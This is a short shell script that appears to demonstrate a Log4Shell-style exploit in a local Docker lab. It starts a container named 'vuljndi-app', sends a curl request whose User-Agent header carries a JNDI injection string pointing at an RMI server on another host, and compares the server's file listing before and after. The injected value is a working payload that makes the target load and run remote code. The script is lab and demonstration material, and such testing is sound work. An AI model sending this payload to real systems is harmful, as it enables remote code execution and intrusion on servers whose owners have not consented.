#!/bin/sh
set -e

cd "$(dirname "$0")"

docker-compose up -d

echo "waiting for services..."
sleep 3

SERVER=vuljndi-app

echo "Server home file list"
docker exec $SERVER ls -al

echo "Sending Injection Code..."
TARGET_URL="http://127.0.0.1:8080"
USER_AGENT='${jndi:rmi://10.0.0.3:1099/t0skrw}'
curl -v $TARGET_URL -H "User-Agent: $USER_AGENT"

echo "Server home file list"
docker exec $SERVER ls -al

docker-compose down
